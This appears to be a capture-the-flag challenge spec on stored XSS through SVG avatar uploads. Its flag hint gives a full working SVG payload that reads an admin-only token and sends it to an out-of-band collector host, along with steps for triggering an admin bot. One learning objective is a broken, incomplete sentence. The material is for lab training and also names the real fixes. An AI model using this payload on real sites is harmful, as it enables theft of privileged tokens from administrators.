title: Stored XSS via SVG Avatar Upload (image/svg+xml + <object>)
learning_objectives: Recognise that a user-uploaded SVG served with Content-Type image/svg+xml is an executable HTML/JS document, not an inert image
Understand why rasterises an SVG safely but
Defeat weak upload validation that trusts a declared MIME type and a `<svg` magic-prefix while never stripping scripts or event handlers
Chain same-origin fetch of an admin-only endpoint from an injected script — the cookie rides along automatically, even against HttpOnly
Name the real fixes: serve user SVGs as text/plain or through an image proxy, sanitise the markup, and apply a script-blocking CSP
flag_hint: Upload an SVG avatar whose body is <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/admin/token').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?t='+encodeURIComponent(t)})</script></svg> (multipart, Content-Type image/svg+xml). POST /report the returned /u/<uuid>; the admin bot loads it and the <object>-embedded SVG runs. Read the token via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: SVG avatar upload served image/svg+xml + <object> embed
inspired_by: The classic stored-XSS-via-SVG-upload pattern (a scripted image/svg+xml served as a document and embedded with <object>), abstracted for local Docker with a Playwright victim bot and an OOB collector
